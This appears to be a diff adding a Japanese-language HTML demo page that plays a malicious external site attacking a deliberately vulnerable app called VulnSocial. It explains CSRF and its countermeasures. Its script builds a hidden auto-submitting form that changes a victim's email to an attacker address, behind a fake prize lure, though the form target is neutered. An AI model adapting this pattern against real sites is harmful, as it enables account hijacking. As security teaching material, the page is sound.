@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>外部サイト - CSRF攻撃デモ</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+        .warning {
+            background: rgba(255,255,255,0.2);
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            border: 2px solid rgba(255,255,255,0.3);
+        }
+        button {
+            background: rgba(255,255,255,0.2);
+            color: white;
+            border: 2px solid white;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+        button:hover {
+            background: rgba(255,255,255,0.3);
+        }
+        #attack-form {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 外部サイト</h1>
+        <p>これは悪意のある外部サイトのシミュレーションです</p>
+        
+        <div class="warning">
+            <h3>⚠️ CSRF攻撃デモ</h3>
+            <p>このページは、VulnSocialアプリケーションに対するCSRF攻撃を実演します。</p>
+            <p>実際の攻撃では、ユーザーが気づかないうちに設定が変更される可能性があります。</p>
+        </div>
+        
+        <h3>無害に見えるコンテンツ</h3>
+        <p>🎉 おめでとうございます！あなたは1000万人目の訪問者です！</p>
+        <p>🎁 素晴らしい賞品を獲得するチャンスです！</p>
+        
+        <button onclick="showAttackDemo()">賞品を受け取る</button>
+        <button onclick="executeCSRFAttack()">自動的にCSRF攻撃を実行</button>
+        
+        <!-- 隠されたCSRF攻撃フォーム -->
+        <iframe id="attack-form" name="attack-frame" style="display: none;"></iframe>
+        
+        <div id="attack-status"></div>
+        
+        <div class="warning" style="margin-top: 30px;">
+            <h4>教育目的の説明</h4>
+            <p><strong>CSRF（Cross-Site Request Forgery）攻撃とは：</strong></p>
+            <ul style="text-align: left;">
+                <li>ユーザーが認証済みのサイトに対して、意図しないリクエストを送信させる攻撃</li>
+                <li>攻撃者は被害者のセッションを利用して不正な操作を実行</li>
+                <li>被害者は攻撃が行われていることに気づかない場合が多い</li>
+            </ul>
+            <p><strong>対策：</strong></p>
+            <ul style="text-align: left;">
+                <li>CSRFトークンの実装</li>
+                <li>SameSite Cookieの使用</li>
+                <li>Referrerヘッダーの検証</li>
+                <li>重要な操作での再認証</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        function showAttackDemo() {
+            document.getElementById('attack-status').innerHTML = `
+                <div class="warning">
+                    <h4>🚨 CSRF攻撃が実行されました！</h4>
+                    <p>もしVulnSocialにログインしている場合、あなたの設定が以下のように変更されました：</p>
+                    <ul style="text-align: left;">
+                        <li>メールアドレス: hacked@attacker.com</li>
+                        <li>自己紹介: 私のアカウントはハッキングされました</li>
+                    </ul>
+                    <p>VulnSocialに戻って設定を確認してください。</p>
+                </div>
+            `;
+            
+            // 実際のCSRF攻撃をシミュレート
+            executeCSRFAttack();
+        }
+        
+        function executeCSRFAttack() {
+            // VulnSocialアプリケーションの設定更新を試行
+            // 実際の攻撃では、被害者のブラウザから自動的にリクエストが送信される
+            
+            const attackForm = document.createElement('form');
+            attackForm.method = 'POST';
+            attackForm.action = 'javascript:void(0)'; // 実際の攻撃では対象サイトのURL
+            attackForm.target = 'attack-frame';
+            attackForm.style.display = 'none';
+            
+            // 攻撃パラメータ
+            const emailField = document.createElement('input');
+            emailField.type = 'hidden';
+            emailField.name = 'email';
+            emailField.value = 'hacked@attacker.com';
+            
+            const bioField = document.createElement('input');
+            bioField.type = 'hidden';
+            bioField.name = 'bio';
+            bioField.value = '私のアカウントはハッキングされました';
+            
+            attackForm.appendChild(emailField);
+            attackForm.appendChild(bioField);
+            document.body.appendChild(attackForm);
+            
+            // フォームを自動送信
+            attackForm.submit();
+            
+            // VulnSocialアプリケーションに直接アクセスして設定を変更
+            // （同一オリジンの場合のみ動作）
+            try {
+                if (window.opener && window.opener.currentUser) {
+                    window.opener.currentUser.email = 'hacked@attacker.com';
+                    window.opener.currentUser.bio = '私のアカウントはハッキングされました';
+                    
+                    // usersリストも更新
+                    const userIndex = window.opener.users.findIndex(u => u.id === window.opener.currentUser.id);
+                    if (userIndex !== -1) {
+                        window.opener.users[userIndex].email = 'hacked@attacker.com';
+                        window.opener.users[userIndex].bio = '私のアカウントはハッキングされました';
+                    }
+                    
+                    window.opener.showMessage('CSRF攻撃により設定が変更されました！', 'warning');
+                }
+            } catch (error) {
+                console.log('CSRF攻撃シミュレーション（同一オリジンでない場合は正常に失敗）');
+            }
+            
+            document.getElementById('attack-status').innerHTML = `
+                <div class="warning">
+                    <h4>⚡ CSRF攻撃を実行しました</h4>
+                    <p>VulnSocialアプリケーションにログインしている場合、設定が変更された可能性があります。</p>
+                    <p>元のタブに戻って確認してください。</p>
+                </div>
+            `;
+        }
+        
+        // ページ読み込み時に自動的に攻撃を実行（実際の攻撃のシミュレーション）
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                // 実際の攻撃では、ユーザーが気づかないうちに実行される
+                console.log('CSRF攻撃が自動実行されました（デモ）');
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
